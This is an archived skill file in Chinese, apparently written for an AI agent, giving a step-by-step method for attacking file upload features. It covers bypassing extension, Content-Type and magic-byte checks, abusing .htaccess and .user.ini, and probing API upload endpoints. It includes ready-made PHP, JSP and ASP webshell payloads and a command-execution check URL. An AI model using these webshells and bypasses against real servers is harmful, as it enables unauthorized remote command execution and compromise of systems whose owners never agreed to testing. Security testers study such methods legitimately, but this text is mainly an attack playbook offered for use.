<!-- archived from /root/.hermes/skills/security/file-upload-methodology/SKILL.md on 2026-10-21 -->

---
name: file-upload-methodology
description: "任意文件上传的检测、绕过和利用。当目标有上传功能(头像、附件、导入)、multipart表单、文件管理接口时使用。包含扩展名/Content-Type/Magic Bytes三层绕过、.htaccess覆盖、.user.ini+auto_prepend_file、图片马二次渲染绕过、ZIP解压利用、上传路径猜解方法"
metadata:
  tags: "arbitrary_file_upload,file upload,webshell,bypass,path-traversal,rce,upload,multipart,Content-Type绕过,双扩展名,MIME,文件上传,avatar,头像,attachment,附件,import,导入,图片上传,image upload"
  category: "exploit"
---

> 归档卡：原目录 `/root/.hermes/skills/security/file-upload-methodology`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/file-upload-methodology/…')`，不要相对 `references/legacy/` 解析。

# 文件上传漏洞方法论

## ⛔ 深入参考（必读）

- 需要扩展名/Content-Type/Magic Bytes 绕过详解、路径穿越、.htaccess 覆盖、.user.ini 利用、图片马二次渲染绕过、ZIP 解压利用 → [references/upload-bypass.md](references/upload-bypass.md)

---

## Phase 0: 上传功能发现与分析（最先执行！）

1. 寻找 `<form enctype="multipart/form-data">` 或 `<input type="file">`
2. 常见端点：`/upload`, `/api/upload`, `/avatar`, `/import`
3. **关键收集**：允许的文件类型、上传后存储路径、服务器技术栈（PHP/Java/Python）

**陷阱**：前端 JS 验证可以直接绕过，真正的限制在后端。

## Phase 1: 基础上传测试

1. 先上传正常文件（.txt）确认功能正常，**记录返回的文件路径**
2. 访问上传的文件 URL — 确认可访问
3. 上传 .php 文件，观察是否被拒绝

**路径猜解**：`/uploads/`, `/upload/`, `/files/`, `/static/uploads/`, `/images/`

## Phase 2: 绕过决策树

```
上传被拒绝？
├─ 扩展名限制（黑名单）→ .phtml/.php5/大小写/.php./双写 → [references/upload-bypass.md](references/upload-bypass.md)
├─ 扩展名限制（白名单）→ .htaccess 覆盖（Apache）或 .user.ini（通用）→ [references/upload-bypass.md](references/upload-bypass.md)
├─ Content-Type 限制 → 改为 image/jpeg
├─ 文件头检查 → GIF89a + webshell
├─ 二次渲染检查 → 图片马（GIF 优先）→ [references/upload-bypass.md](references/upload-bypass.md)
└─ 三层都限制 → 组合绕过：扩展名 + Content-Type + 文件头
```

## Phase 3: Webshell Payload

**PHP**（最常见）：
```php
<?php system($_GET['cmd']); ?>
```
精简版（绕过关键字）：`<?=`$_GET[1]`?>`

**JSP**: `<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>`
**ASP**: `<%eval request("cmd")%>`

### 上传后验证
```
http://target/uploads/shell.php?cmd=id
```
**陷阱**：访问 .php 返回源代码 → 该目录禁止执行，需要路径穿越或 .htaccess。

## Phase 4: API 上传端点验证链（无认证 FastAPI/uvicorn 面）

现代 API 上传没有三层校验可绕——重点从「绕过」转到「验证链完整性与业务影响」：

1. **契约先行**：GET /openapi.json 直接给出全部路由 + requestBody schema（multipart 字段名、required、数组还是单文件）。uvicorn 面 openapi 401/404 才回退到路径 fuzz。字段名从契约拿，不猜。
2. **裸 multipart 探针**：探测工具能发 POST 原始 body 就能发 multipart——自造 boundary 手拼完整 body，配 `Content-Type: multipart/form-data; boundary=<B>`：
   ```
   --B
Content-Disposition: form-data; name="<字段名>"; filename="probe.csv"
Content-Type: text/csv

<内容>
--B--

   ```
   数组字段（files[]/new_files[]）重复该 part 即可；无认证面直接发，有认证面先解决 key。
3. **上传 200 ≠ 落盘**：必须经列表/回读端点确认持久化（返回的 id、stored_name、解析计数如 usernames_found）——这是第一级证据。
4. **运营影响闭环**：上传数据若参与目标业务（过滤/合并/排除/导入），再构造一次处理调用，用响应里的业务计数器（如 removed_by_exclude>0）证明注入数据实际改变了业务输出——比「文件已存储」高一档，控制原语实锤。
5. **文件名控制判定**：看响应 stored_name 是否服务端生成（uuid 重命名）——服务端 uuid 重命名 = 文件名控制死，穿越/落地 webshell 线即刻降级，火力转向内容解析器与业务影响面。
6. **探针纪律**：探针文件自标记命名（pentest_probe 字样），既是授权痕迹也便于事后对账；配置类面先 GET 存基线再改，测完回滚。

## 注意事项
- **上传成功 ≠ 可利用**：必须访问验证执行；RCE 打不通时，三级证据（200 入库 → 持久化回读 → 业务计数器变化）本身就是高价值确认项
- **服务端可能 hash 重命名**：从响应中获取新文件名
- **记录每次尝试的扩展名和响应**：快速排除无效绕过

## .htaccess 攻击
- 两步法：先上传 .htaccess 配置 PHP 解析规则，再上传 shell.jpg

## 上传≠执行
- 上传成功不代表能利用（上传≠执行），需要确认文件可被访问和解析
- 配合文件包含（LFI）等其他漏洞执行上传的 webshell
